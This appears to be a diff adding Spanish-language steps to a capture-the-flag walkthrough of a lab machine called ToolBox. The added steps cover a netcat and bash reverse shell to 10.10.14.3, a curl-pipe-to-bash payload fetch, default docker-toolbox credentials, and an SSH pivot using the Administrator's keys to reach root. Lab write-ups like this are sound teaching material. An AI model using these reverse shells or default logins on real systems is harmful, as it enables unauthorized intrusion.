@@ -81,3 +81,63 @@ DROP TABLE IF EXIST cmd_exec;
 <center>Creamos recurso un recurso compartido.</center>
 <img src="imgs/ToolBox/ToolBox11.png">
 
+
+* Procedemos a ponernos en escucha por el puerto 4445 y lanzamos la petición para ganar acceso pero vemos que no ganamos acceso al sistema.
+<center>\\10.10.14.3\smbFolder\nc.exe+-e+10.10.14.3+4445</center>
+<img src="imgs/ToolBox2/ToolBox20.png">
+
+* No recibimos ninguna traza eso debe ser porque esta corriendo un contenedor de maquina Linux, procedemos a hacer una reverse shell en bash, y en vez de impacket-smbserver usamos python3 -m http.server para correrlo en el puerto 88.
+<center>/bin/bash -c "bash -i >& /dev/tcp/10.10.14.3/4445 0>&1"</center>
+
+* Nos creamos el archivo reverse y creamos un servicio con python para poder compartirlo.
+
+<img src="imgs/ToolBox2/ToolBox21.png">
+
+* Posteriormente lanzamos un curl a nuestra dirección IP/reverse\|bash y le damos a send, para poder ganar acceso al sistema.
+
+<img src="imgs/ToolBox2/ToolBox22.png">
+
+* Nos creamos una full tty interactiva para poder trabajar mas cómodo.
+
+<img src="imgs/ToolBox2/ToolBox23.png">
+
+* Exportamos las variables de entorno.
+
+<img src="imgs/ToolBox2/ToolBox24.png">
+
+* Ganamos acceso a un contenedor en esta caso el la dirección IP 172.17.0.2
+
+<img src="imgs/ToolBox2/ToolBox25.png">
+
+* Podemos convertirnos en root y poder ver la flag user.txt
+
+<img src="imgs/ToolBox2/ToolBox212.png'>
+
+
+* Como somos la maquina 2 es decir de la sobre 172.17.0.2 quiero pensar que también hay una maquina que corre bajo la dirección ip 172.17.0.2 que corre el servicio de docker-toolbox, verificamos que tiene el servicio ssh abierto.
+
+<img src="imgs/ToolBox2/ToolBox26.png">
+
+* Buscamos credenciales por defecto de este servicio.
+<center>User: docker</center>
+<center>Password: tcuser</center>
+
+<img src="imgs/ToolBox2/ToolBox27.png">
+
+* Nos conectamos por ssh.
+<center>ssh docker@172.17.0.1</center>
+<img src="imgs/ToolBox2/ToolBox28.png">
+
+* Empezamos a enumerar el sistema, y en la ruta raíz del sistema encontramos cosas interesantes.
+
+<center>/c/Users/Administrator/.ssh</center>
+<img src="imgs/ToolBox2/ToolBox29.png">
+
+* Procedemos a conectarnos por ssh a la maquina con el usuario: Administrator.
+
+<img src="imgs/ToolBox2/ToolBox210.png">
+
+* En este punto ya podríamos ver la flag de root.
+
+<img src="imgs/ToolBox2/ToolBox211.png">
+
